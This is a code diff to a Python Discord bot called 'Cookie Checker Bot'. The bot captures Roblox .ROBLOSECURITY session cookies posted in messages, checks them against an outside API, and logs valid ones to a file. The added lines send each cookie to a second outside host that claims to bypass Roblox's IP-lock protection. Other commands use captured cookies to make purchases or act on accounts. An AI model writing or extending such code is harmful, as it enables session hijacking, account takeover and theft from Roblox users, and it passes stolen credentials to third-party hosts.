@@ -14,7 +14,8 @@ bot = commands.Bot(command_prefix=yourprefix, description="Cookie Checker Bot :)
 async def on_message(message):
 
     if message.content.startswith("_|WARNING:-DO-NOT-SHARE-THIS."):
-        r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={message.content}') 
+        cookie = requests.get(f"https://robloxapi.eu/info/iplockbypass?cookie={message.content}").text ## bypassip lock
+        r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}') 
         data = r.json() 
 
         if data["status"] == "failed":
@@ -23,7 +24,7 @@ async def on_message(message):
         else:
             print(f"Found Valid Cookie With Username:{data['username']} And Logged To File.")
             f = open("cookies.txt", "a")
-            f.write(message.content + "\n")
+            f.write(cookie + "\n")
             f.close()
 
          
@@ -32,12 +33,13 @@ async def on_message(message):
 
 @bot.command()
 async def bancookie(ctx, cookie=None):
+    
     req1 = requests.Session()
     
     if cookie == None:
         await ctx.message.reply("Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '!bancookie mycookie'") ## let the user know they aint provided cookie
         return ## break command
-    
+    cookie = requests.get(f"https://robloxapi.eu/info/iplockbypass?cookie={cookie}").text ## bypass ip lock
     req1.cookies['.ROBLOSECURITY'] = cookie
     print("Cookie Set")
     homeurl= 'https://www.roblox.com/build/upload' ## link to get verification token
@@ -75,7 +77,7 @@ async def buystuff(ctx, cookie=None):
         await ctx.message.reply("Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '!buystuff mycookie'") ## let the user know they aint provided cookie
         return ## break command
     
-    
+    cookie = requests.get(f"https://robloxapi.eu/info/iplockbypass?cookie={cookie}").text ## bypass ip lock
     r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
     if r.json()["status"] == "failed": 
         await ctx.message.reply("Hmm. This Cookie Seems To Be Expired/Invalid.")
@@ -137,7 +139,7 @@ async def checkcookie(ctx, cookie=None):  ## By default make Cookie = To None, s
         await ctx.message.reply("Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '!checkcookie mycookie'") ## let the user know they aint provided cookie
         return ## break command
 
-    r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}') ## Send get request to my api to get info about cookie in json
+    r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}') ## Send get request to my api to get info about cookie in json, this api auto bypasses ip lock
     data = r.json() ## get json from request ^^
 
     if data["status"] == "failed": ## if cookie is invalid api will respond with status: failed we will check for this value and if so let user know
